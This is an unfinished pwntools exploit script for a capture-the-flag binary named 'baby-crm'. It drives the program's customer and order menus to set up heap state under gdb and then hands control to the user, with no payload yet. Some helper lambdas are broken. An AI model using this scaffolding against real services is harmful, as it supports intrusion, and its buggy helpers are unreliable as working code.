#!/usr/bin/env python3

from pwn import *

exe = ELF("baby-crm")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

sa   = lambda a,b : r.sendafter(a,b)
sla  = lambda a,b : r.sendlineafter(a,b)
sd   = lambda a,b : r.send(a,b)
sl   = lambda a,b : r.sendline(a,b)
ru   = lambda a : r.recvuntil(a, drop=True)
rc   = lambda : r.recv(4096)
uu32 = lambda data : u32(data.ljust(4, b'\0'))
uu64 = lambda data : u64(data.ljust(8, b'\0'))

def new_customer(name):
    sla(b">", b"1")
    sla(b"Customer name: ", name)

def show_customer(idx):
    sla(">", "3")
    sla("Customer to show:", str(idx))

def change_customer_name(idx, name):
    sla(">", "2")
    sla("Customer to alter: ", str(idx))
    sla(">", "1")
    sla("New name", name)

def alter_noopt(idx):
    sla(">", "2")
    sla("Customer to alter: ", str(idx))
    sla(">", "5")

def add_order(idx, value, description):
    sla(">", "2")
    sla("Customer to alter: ", str(idx))
    sla(">", "3")
    sla("Order value: ", str(value))
    sla(">", "")

def help_order():
    sla(">", "4")
    sla(">", "1")

def edit_order(customer, idx, desc):
    sla(">", "2")
    sla("Customer to alter:", str(customer))
    sla(">", "4")
    sla("Order to edit:", str(idx))
    sla("New description:", desc)


def main():
    gdb.attach(r, gdbscript="b *main+22")

    new_customer(b"AAAAAAAA")
    new_customer(b"DDDDDDDD")
    alter_noopt(0)
    help_order()
    
    add_order(1, 1337, "")
    
    show_customer(1)
    r.interactive()



if __name__ == "__main__":
    main()
